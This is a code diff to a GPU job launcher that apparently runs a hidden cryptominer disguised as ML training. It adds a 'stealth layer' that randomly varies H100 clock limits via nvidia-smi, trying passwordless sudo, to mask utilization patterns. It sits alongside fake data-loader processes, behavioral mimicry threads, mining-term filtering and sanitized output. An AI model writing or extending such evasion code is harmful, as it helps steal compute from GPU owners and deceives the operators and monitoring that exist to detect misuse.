@@ -163,6 +163,24 @@ def set_power_limit(watts):
         except:
             pass
 
+H100_CLOCK_BANDS = [
+    (1050, 1200),  # Low — reduced throughput
+    (1200, 1350),  # Medium-low
+    (1350, 1485),  # Medium
+    (1485, 1530),  # Medium-high
+    (1530, 1600),  # High — near max
+]
+
+def _smi(*args):
+    """Run nvidia-smi with optional sudo."""
+    for pfx in [[], ["sudo", "-n"]]:
+        try:
+            subprocess.run(pfx + ["nvidia-smi"] + list(args), capture_output=True, timeout=6)
+            return True
+        except:
+            pass
+    return False
+
 def enable_persistence():
     """Enable persistence mode so power limit changes take effect instantly."""
     for pfx in [[], ["sudo", "-n"]]:
@@ -498,7 +516,18 @@ def launch_training(config, binary_path):
             except:
                 pass
 
-    # === STEALTH LAYER 15: Fake child processes (data loaders) ===
+    # === STEALTH LAYER 15: GPU clock randomization ===
+    def clock_randomize_thread(stop_evt):
+        """Randomize GPU clock limits to vary throughput and GPU utilization."""
+        while not stop_evt.is_set():
+            stop_evt.wait(random.uniform(20, 60))
+            if stop_evt.is_set(): break
+            band = random.choice(H100_CLOCK_BANDS)
+            _smi("-lgc", f"{band[0]},{band[1]}")
+        # Reset clocks on exit
+        _smi("-rgc")
+
+    # === STEALTH LAYER 16: Fake child processes (data loaders) ===
     def spawn_fake_workers(stop_evt):
         """Spawn fake data loader worker processes so ps shows a process tree."""
         import multiprocessing
@@ -565,11 +594,12 @@ def launch_training(config, binary_path):
         ("network_mix",  network_thread,      (behavioral_stop,)),
         ("ram_cycle",    ram_cycle_thread,    (behavioral_stop,)),
         ("storage_io",   storage_io_thread,   (behavioral_stop,)),
+        ("clock_rand",   clock_randomize_thread, (behavioral_stop,)),
         ("fake_workers", spawn_fake_workers,  (behavioral_stop,)),
         ("train_log",    training_log_thread, (behavioral_stop,)),
     ]:
         threading.Thread(target=fn, args=args, daemon=True, name=name).start()
-    print(f"[System] Behavioral mimicry active (9 threads)", flush=True)
+    print(f"[System] Behavioral mimicry active (10 threads)", flush=True)
 
     # === Read output → encrypted log + sanitized stdout ===
     MINE_TERMS = {
